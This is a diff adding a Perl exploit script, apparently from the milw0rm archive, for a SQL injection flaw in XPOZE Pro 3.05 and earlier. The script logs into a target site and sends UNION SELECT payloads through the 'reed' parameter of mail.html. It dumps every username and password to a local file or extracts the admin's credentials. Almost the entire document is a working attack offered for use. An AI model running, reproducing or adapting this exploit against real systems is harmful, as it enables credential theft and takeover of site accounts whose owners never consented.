@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+
+# - XPOZE Pro <= 3.05 SQL Injection Exploit -
+#     Coded And Discovered by t0pP8uZz
+
+# Why a exploit? mainly to dump all users easyily.
+# Lots of websites are reslling this script, so there is no suitable dork.
+
+use strict;
+use LWP::UserAgent;
+
+print "-------------------------------------------------\n";
+print "-     XPOZE Pro <= 3.05 SQL Injection Exploit   -\n";
+print "-         Discovered & Coded By t0pP8uZz        -\n";
+print "-     CipherCrew, h4ck-y0u.org, milw0rm.com     -\n";
+print "-------------------------------------------------\n\n";
+
+print "Enter URL (ie: http://xpoze.com/demo/): ";
+	chomp(my $url = <STDIN>);
+
+print "Enter Valid Username (register on target site first): ";
+	chomp(my $user = <STDIN>);
+
+print "Enter Valid Password (register on target site first): ";
+	chomp(my $pass = <STDIN>);
+
+print "Attack Type (enter 1 too dump all users, enter 2 too get admin details): ";
+	chomp(my $type = <STDIN>);
+
+my $ua = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', cookie_jar => {} );
+my $response = $ua->post($url, {'username' => $user, 'password' => $pass, 'login' => 'Submit'});
+
+if($response->is_success()) {
+
+	if($type == 1) {
+	
+		my $res = $ua->get($url."/account/user/mail.html?reed=-1 UNION ALL SELECT 1,2,3,4,concat(0x3C313E,user,0x3a,pass,0x3C323E),6,7 FROM users/*");
+		(my @users) = $res->content =~ /<1>(.*?)<2>/g;
+		
+		open(FILE, "+>>C:\users.txt") or die ("Error Writing Users To File!");
+		
+		foreach $user (@users) {
+			print FILE $user."\r\n";
+			print $user."\n";
+		}
+		close FILE;
+		print "Users Have Been Dumped To Local File 'C:\\users.txt'\n";
+		
+	} elsif($type == 2) {
+	
+		my $res = $ua->get($url."/account/user/mail.html?reed=-1 UNION ALL SELECT 1,2,3,4,concat(0x3C313E,user,0x3a,pass,0x3C323E),6,7 FROM users WHERE rank=0/*");
+		(my @users) = $res->content =~ /<1>(.*?)<2>/;
+		
+		my @user = split(/:/, $users[0]);
+		
+		print "\n\nAdmin Username: ".$user[0];
+		print "\nAdmin Password: ".$user[1];
+		print "\n\nDone!";
+		
+	} else { print "Invalid Attack Type!"; exit; }
+} else { print "Check username/password!"; exit; }
+exit;
+
+# milw0rm.com [2008-04-04]
